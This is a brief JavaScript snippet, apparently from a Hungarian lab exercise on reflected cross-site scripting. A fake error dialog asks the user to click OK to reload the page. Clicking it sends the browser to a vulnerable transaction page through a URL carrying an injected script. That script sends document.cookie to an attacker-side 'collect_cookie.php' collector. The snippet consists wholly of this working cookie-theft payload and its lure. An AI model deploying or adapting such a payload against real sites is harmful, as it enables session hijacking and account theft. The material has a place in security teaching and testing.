if (window.confirm("Az oldal betöltése során hiba merült fel! Kérem, kattintson az 'OK' gombra az újratöltéshez!")) 
{
  //Link sérülékeny elemének kialakításához használt forrás: 
  window.location.href="http://192.168.0.105:8080/xss_user/vedekezes_elott/transaction.php?default=Angol<script>document.location='http://192.168.0.105:8080/xss_attacker/collect_cookie.php?c='+document.cookie;</script>";
};